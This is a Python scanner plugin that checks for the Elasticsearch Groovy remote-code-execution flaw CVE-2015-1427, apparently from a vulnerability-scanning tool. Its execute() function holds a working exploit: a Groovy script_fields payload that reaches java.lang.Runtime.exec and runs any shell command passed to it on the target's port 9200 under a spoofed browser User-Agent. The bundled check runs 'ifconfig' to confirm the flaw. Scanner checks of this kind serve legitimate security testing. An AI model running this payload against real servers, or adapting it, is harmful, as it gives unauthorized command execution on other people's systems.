#!/usr/bin/env python
# -*- coding: utf-8 -*-
# __author__ = '1c3z'
# __author__ = 'xfkxfk'

import json
import httplib
from lib.common import save_user_script_result


def execute(ip, command):
    parameters = {
        "size": 1,
        "script_fields":
            {
                "iswin":
                    {
                        "script": '''java.lang.Math.class.forName("java.io.BufferedReader").getConstructor(java.io.
                        Reader.class).newInstance(java.lang.Math.class.forName("java.io.InputStreamReader").
                        getConstructor(java.io.InputStream.class).newInstance(java.lang.Math.class.forName("java.
                        lang.Runtime").getRuntime().exec("%s").getInputStream())).readLines()''' % command,
                        "lang": "groovy"
                    }
            }
    }
    data = json.dumps(parameters)
    try:
        agent = 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36'
        url = "http://%s:9200/_search?pretty" % ip
        conn = httplib.HTTPConnection(ip, port=9200, timeout=10)
        headers ={"Content-Type": "application/x-www-form-urlencoded", "User-Agent": agent}
        conn.request(method='POST', url=url, body=data, headers=headers)
        resp = conn.getresponse()
        code = resp.status
        body = resp.read()
        if code != 200:
            return
        if body:
            body = json.loads(body)
            result = body["hits"]["hits"][0]["fields"]["iswin"][0]
            if result.find('inet addr') >= 0:
                return True
    except Exception as e:
        pass


def do_check(self, url):
    if url != '/':
        return
    ip = self.host.split(':')[0]
    if execute(ip, 'ifconfig'):
        save_user_script_result(self, '', 'http://%s:9200/_search?pretty' % ip,
                                'ElasticSearch Groovy remote code exec CVE-2015-1427')
